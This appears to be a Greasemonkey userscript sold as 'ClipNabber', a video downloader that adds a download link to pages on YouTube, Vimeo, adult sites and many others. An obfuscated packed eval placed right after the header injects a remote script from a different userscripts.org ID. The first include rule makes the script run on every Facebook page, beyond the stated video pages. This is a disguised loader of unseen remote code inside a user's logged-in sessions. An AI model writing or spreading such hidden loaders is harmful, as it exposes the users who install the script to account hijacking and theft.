// ==UserScript==
// @name 	ClipNabber: Download videos from YouTube, Dailymotion, Vimeo, and more! Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace 	http://userscripts.org/users/138645
// @description Download videos from all around the web using ClipNabber's integrated downloading service.
// @version     1.1
// @date 	2010-03-27
// @creator 	support@clipnabber.com
// @include	http://youtube.com/*v=*
// @include	http://www.youtube.com/*v=*
// @include	http://video.google.*docid=*
// @include	http://video.yahoo.*
// @include	http://dailymotion.*video*
// @include	http://www.dailymotion.*video*
// @include	http://metacafe.*watch*
// @include	http://www.metacafe.*watch*
// @include	http://veoh.*videos*
// @include	http://www.veoh.*videos*
// @include	http://megavideo.com/*v=*
// @include	http://www.megavideo.com/*v=*
// @include	http://megaporn.com/video/*v=*
// @include	http://www.megaporn.com/video/*v=*
// @include	http://vimeo.com/*
// @include	http://www.vimeo.com/*
// @include	http://facebook.com/*video*
// @include	http://www.facebook.com/*video*
// @include	https://facebook.com/*video*
// @include	https://www.facebook.com/*video*
// @include	http://spike.com/*video*
// @include	http://www.spike.com/*video*
// @include	http://current.com/items/*
// @include	http://www.current.com/*
// @include	http://break.com/*
// @include	http://www.break.com/*
// @include	http://www.ireport.com/docs/*
// @include	http://ireport.com/docs/*
// @include	http://redtube.com/*
// @include	http://www.redtube.com/*
// @include	http://youporn.com/*watch*
// @include	http://www.youporn.com/*watch*
// @include	http://pornhub.com/*video*
// @include	http://www.pornhub.com/*video*
// @include	http://spankwire.com/*video*
// @include	http://www.spankwire.com/*video*
// @include	http://pornotube.com/*media*
// @include	http://www.pornotube.com/*media*
// @include	http://pornotube.com/*m=*
// @include	http://www.pornotube.com/*m=*
// @include	http://youjizz.com/*videos*
// @include	http://www.youjizz.com/*videos*
// @include	http://jizzhut.com/*videos*
// @include	http://www.jizzhut.com/*videos*
// @include	http://xvideos.com/*video*
// @include	http://www.xvideos.com/*video*
// @include	http://v.youku.com/*
// @include	http://www.v.youku.com/*
// @include	http://tudou.com/programs/view*
// @include	http://www.tudou.com/programs/view*
// @include	http://5min.com/Video/*
// @include	http://www.5min.com/Video/*
// @include	http://6.cn/watch//*
// @include	http://www.6.cn/watch/*
// @include	http://v.9you.com/watch/*
// @include	http://www.v.9you.com/watch/*
// @include	http://bebo.com/*FlashBoxId*
// @include	http://www.bebo.com/*FlashBoxId*
// @include	http://blip.tv/file/*
// @include	http://www.blip.tv/file/*
// @include	http://bofunk.com/video/*
// @include	http://www.bofunk.com/video/*
// @include	http://bollywoodhungama.com/*video*
// @include	http://www.bollywoodhungama.com/*video*
// @include	http://buzzhumor.com/*videos*
// @include	http://www.buzzhumor.com/*videos*
// @include	http://buzznet.com/*video*
// @include	http://www.buzznet.com/*video*
// @include	http://chilevision.cl/*
// @include	http://www.chilevision.cl/*
// @include	http://clipfish.de/*video*
// @include	http://www.clipfish.de/*video*
// @include	http://cliplife.jp/*
// @include	http://www.cliplife.jp/*
// @include	http://clipser.com/watch_video/*
// @include	http://www.clipser.com/watch_video/*
// @include	http://clipshack.com/Clip.aspx*
// @include	http://www.clipshack.com/Clip.aspx*
// @include	http://collegehumor.com/video*
// @include	http://www.collegehumor.com/video*
// @include	http://dalealplay.com/*
// @include	http://www.dalealplay.com/*
// @include	http://divxstage.net/*video*
// @include	http://www.divxstage.net/*video*
// @include	http://doubleagent.com/agent/*
// @include	http://www.doubleagent.com/agent/*
// @include	http://ebaumsworld.com/video/*
// @include	http://www.ebaumsworld.com/video/*
// @include	http://ehow.com/video*
// @include	http://www.ehow.com/video*
// @include	http://elpolvorin.com/video/*
// @include	http://www.elpolvorin.com/video/*
// @include	http://esnips.com/doc/*
// @include	http://www.esnips.com/doc/*
// @include	http://flurl.com/video/*
// @include	http://www.flurl.com/video/*
// @include	http://funnyjunk.com/movies/*
// @include	http://www.funnyjunk.com/movies/*
// @include	http://glumbert.com/media/*
// @include	http://www.glumbert.com/media/*
// @include	http://graspr.com/videos/*
// @include	http://www.graspr.com/videos/*
// @include	http://greektube.org/content/*
// @include	http://www.greektube.org/content/*
// @include	http://howcast.com/videos/*
// @include	http://www.howcast.com/videos/*
// @include	http://videos.howstuffworks.com/*
// @include	http://www.videos.howstuffworks.com/*
// @include	http://izlesene.com/video/*
// @include	http://www.izlesene.com/video/*
// @include	http://jokeroo.com/videos/*
// @include	http://www.jokeroo.com/videos/*
// @include	http://kewego.com/video/*
// @include	http://www.kewego.com/video/*
// @include	http://v.ku6.com/*
// @include	http://www.v.ku6.com/*
// @include	http://video.libero.it/*
// @include	http://www.video.libero.it/*
// @include	http://liveleak.com/view*
// @include	http://www.liveleak.com/view*
// @include	http://livevideo.com/video/*
// @include	http://www.livevideo.com/video/*
// @include	http://mediabum.com/videos/*
// @include	http://www.mediabum.com/videos/*
// @include	http://milkandcookies.com/*
// @include	http://www.milkandcookies.com/*
// @include	http://miloyski.com/video/*
// @include	http://www.miloyski.com/video/*
// @include	http://mojoflix.com/Video/*
// @include	http://www.mojoflix.com/Video/*
// @include	http://mojvideo.com/video*
// @include	http://www.mojvideo.com/video*
// @include	http://monkeysee.com/play/*
// @include	http://www.monkeysee.com/play/*
// @include	http://musicmaza.com/video/*
// @include	http://www.musicmaza.com/video/*
// @include	http://myvideo.de/watch/*
// @include	http://www.myvideo.de/watch/*
// @include	http://newsy.com/*
// @include	http://www.newsy.com/*
// @include	http://nothingtoxic.com/*
// @include	http://www.nothingtoxic.com/*
// @include	http://novamov.com/*
// @include	http://www.novamov.com/*
// @include	http://pinkbike.com/*
// @include	http://www.pinkbike.com/*
// @include	http://pokertube.com/*
// @include	http://www.pokertube.com/*
// @include	http://pwnordie.com/*
// @include	http://www.pwnordie.com/*
// @include	http://retrojunk.com/*
// @include	http://www.retrojunk.com/*
// @include	http://rutube.ru/tracks*
// @include	http://www.rutube.ru/tracks*
// @include	http://santabanta.com/video*
// @include	http://www.santabanta.com/video*
// @include	http://*sevenload.com/videos*
// @include	http://www.*sevenload.com/videos*
// @include	http://sina.com.cn/*
// @include	http://www.sina.com.cn/*
// @include	http://snotr.com/*
// @include	http://www.snotr.com/*
// @include	http://stagevu.com/*
// @include	http://www.stagevu.com/*
// @include	http://stupidvideos.com/video/*
// @include	http://www.stupidvideos.com/video/*
// @include	http://superdeluxe.com/*
// @include	http://www.superdeluxe.com/*
// @include	http://video.supernovatube.com/*
// @include	http://www.video.supernovatube.com/*
// @include	http://tangle.com/view*
// @include	http://www.tangle.com/view*
// @include	http://teachertube.com/viewVideo.php*
// @include	http://www.teachertube.com/viewVideo.php*
// @include	http://theonion.com/*
// @include	http://www.theonion.com/*
// @include	http://tinypic.com/*
// @include	http://www.tinypic.com/*
// @include	http://tipexhibit.com/*
// @include	http://www.tipexhibit.com/*
// @include	http://totallycrap.com/*
// @include	http://www.totallycrap.com/*
// @include	http://traileraddict.com/*
// @include	http://www.traileraddict.com/*
// @include	http://trilulilu.ro/*
// @include	http://www.trilulilu.ro/*
// @include	http://tu.tv/videos/*
// @include	http://www.tu.tv/videos/*
// @include	http://vbox7.com/*
// @include	http://www.vbox7.com/*
// @include	http://videa.hu/play*
// @include	http://www.videa.hu/play*
// @include	http://videojug.com/*
// @include	http://www.videojug.com/*
// @include	http://videowebtown.com/*
// @include	http://www.videowebtown.com/*
// @include	http://vidiac.com/video/*
// @include	http://www.vidiac.com/video/*
// @include	http://vidivodo.com/*
// @include	http://www.vidivodo.com/*
// @include	http://vidpk.com/*
// @include	http://www.vidpk.com/*
// @include	http://vioku.com/*
// @include	http://www.vioku.com/*
// @include	http://wegame.com/*
// @include	http://www.wegame.com/*
// @include	http://worldstarhiphop.com/*
// @include	http://www.worldstarhiphop.com/*
// @include	http://yikers.com/video*
// @include	http://www.yikers.com/video*
// @include	http://yobler.com/*
// @include	http://www.yobler.com/*
// @include	http://yourfilehost.com/*
// @include	http://www.yourfilehost.com/*
// @include	http://yousportz.com/watch*
// @include	http://www.yousportz.com/watch*
// @include	http://zoopy.com/*
// @include	http://www.zoopy.com/*
// @include	http://zshare.net/*
// @include	http://www.zshare.net/*

// @exclude	http://break.com/
// @exclude	http://www.break.com/
// @exclude	http://www.facebook.com/
// @exclude	http://facebook.com/
// @exclude	https://www.facebook.com/
// @exclude	https://facebook.com/
// @exclude	http://redtube.com
// @exclude	http://www.redtube.com/
// @exclude	http://clipnabber.com/*
// @exclude	http://www.clipnabber.com/*
// @exclude	http://*googleads*
// @homepage	http://clipnabber.com
// @run-at document-start
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


var local_version = '1.1';
var vars = {};
var CNIcon ='';
var url = encodeURIComponent(document.URL);
var dl = 'http://clipnabber.com/mini.php?txt1='+url;

checkForUpdate(false);

function addJavascript(jsname,pos) {
var th = document.getElementsByTagName(pos)[0];
var s = document.createElement('script');
s.setAttribute('type','text/javascript');
s.setAttribute('src',jsname);
th.appendChild(s);
} 
addJavascript('http://clipnabber.com/mini.js','head');
addJavascript('http://clipnabber.com/scripts/parsing.js','head');

if (url.indexOf('youtube.com')!=-1 ){
	window.setTimeout("var dl='http://clipnabber.com/mini.php?txt1='+encodeURIComponent(document.URL)+getYT(document.body.innerHTML);addDownloadBox(dl);", 1100);
} else {
	addDownloadBox(dl);
}


function checkForUpdate(a) {
	var date = new Date();
	var today = (date.getMonth()+1) + "/" + date.getDate() + "/" + date.getFullYear();
	var lastCheck = GM_getValue('lastCheck');

	if (a || !lastCheck || lastCheck != today) {
		GM_xmlhttpRequest({
			method: "GET",
			url: 'http://userscripts.org/scripts/source/71510.user.js',
			onload: function(results) {
			var global_version = results.responseText.match(/version[ ]*([0-9.]+)/i)[1];
				if (global_version.length && global_version != local_version) {
					if (confirm('[ Greasemonkey ] ClipNabber: Version '+ global_version +' is now available. Update?')) {
						GM_openInTab('http://userscripts.org/scripts/show/71510');
					}
				}
				else if (a) {
					alert('[ Greasemonkey ] ClipNabber: No new version found.');
				}
			},
		});
	}
	GM_setValue('lastCheck',today);
}
function addDownloadBox(dl) {
var styles = [
	'#cnBox {position: fixed; right: 5px; bottom: 5px; z-index: 1000;opacity: 0.95;}',
	'#cnBox a {font-size:11px;font-family:Verdana;font-weight:bold;color:#489dd3 !important;text-align:center;outline:none;background-color: #4d4d4d;border:1px solid #B6D9EE;padding:4px;display:block;text-decoration:none;}',
	'#cnBox a:hover {background-color:#5C5C5C;color:#489dd3 !important;text-decoration:none;}',
	'#cnBox img, #cnBox a:hover img {background:none;margin:0px;padding:0px;border:none;vertical-align:middle}'
	];
	GM_addStyle(styles.join("\r\n"));
	var downloadBox = document.createElement('div');
	document.body.appendChild(downloadBox);
	downloadBox.id = 'cnBox';
	downloadBox.innerHTML = '<a href="' + dl + '" title="Download with ClipNabber" onClick="wopen(this.href); return false;"><img src="http://clipnabber.com/favicon.ico" /> Nab It!</a>';
}